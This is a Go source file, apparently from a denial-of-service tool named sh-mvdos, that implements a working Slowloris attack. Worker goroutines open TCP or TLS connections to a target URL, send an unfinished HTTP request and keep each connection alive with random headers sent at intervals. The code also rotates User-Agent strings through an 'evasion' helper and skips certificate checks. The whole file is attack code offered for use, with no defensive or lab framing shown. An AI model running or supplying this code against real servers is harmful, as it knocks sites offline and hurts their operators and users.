package worker

import (
	"context"
	"crypto/tls"
	"fmt"
	"math/rand"
	"net"
	"net/url"
	"sync/atomic"
	"time"

	"github.com/kjsst/sh-mvdos/internal/worker/evasion"
	"github.com/kjsst/sh-mvdos/internal/worker/payload"
)

type Slowloris struct {
	Target  string
	Workers int
}

func (w *Slowloris) Run(ctx context.Context) (uint64, uint64, error) {
	if w.Workers <= 0 {
		w.Workers = 4
	}
	host, port, useTLS, err := slowTarget(w.Target)
	if err != nil {
		return 0, 0, err
	}
	var conns, errs atomic.Uint64
	done := make(chan struct{}, w.Workers)
	for i := 0; i < w.Workers; i++ {
		go func() {
			defer func() { done <- struct{}{} }()
			for {
				select {
				case <-ctx.Done():
					return
				default:
				}
				if err := w.holdOne(ctx, host, port, useTLS); err != nil {
					errs.Add(1)
					time.Sleep(50 * time.Millisecond)
					continue
				}
				conns.Add(1)
			}
		}()
	}
	<-ctx.Done()
	for i := 0; i < w.Workers; i++ {
		<-done
	}
	return conns.Load(), errs.Load(), ctx.Err()
}

func (w *Slowloris) holdOne(ctx context.Context, host, port string, useTLS bool) error {
	d := net.Dialer{Timeout: 5 * time.Second}
	raw, err := d.DialContext(ctx, "tcp", net.JoinHostPort(host, port))
	if err != nil {
		return err
	}

	var conn net.Conn = raw
	if useTLS {
		tlsConn := tls.Client(raw, &tls.Config{
			ServerName:         host,
			InsecureSkipVerify: true,
			MinVersion:         tls.VersionTLS12,
		})
		if err := tlsConn.HandshakeContext(ctx); err != nil {
			raw.Close()
			return err
		}
		conn = tlsConn
	}

	partial := fmt.Sprintf("GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept: */*\r\n",
		host, evasion.RandUA())
	if _, err := conn.Write([]byte(partial)); err != nil {
		conn.Close()
		return err
	}

	closed := make(chan struct{})
	go func() {
		select {
		case <-ctx.Done():
			conn.Close()
		case <-closed:
		}
	}()
	defer close(closed)

	ticker := time.NewTicker(time.Duration(8+rand.Intn(12)) * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			return nil
		case <-ticker.C:
			line := fmt.Sprintf("X-%s: %s\r\n", payload.RandString(3), payload.RandString(6+rand.Intn(12)))
			if _, err := conn.Write([]byte(line)); err != nil {
				conn.Close()
				return err
			}
		}
	}
}

func slowTarget(raw string) (host, port string, useTLS bool, err error) {
	u, err := url.Parse(raw)
	if err != nil {
		return "", "", false, err
	}
	host = u.Hostname()
	if host == "" {
		return "", "", false, fmt.Errorf("slowloris: empty host")
	}
	port = u.Port()
	useTLS = u.Scheme == "https" || u.Scheme == "wss"
	if port == "" {
		if useTLS {
			port = "443"
		} else {
			port = "80"
		}
	}
	return host, port, useTLS, nil
}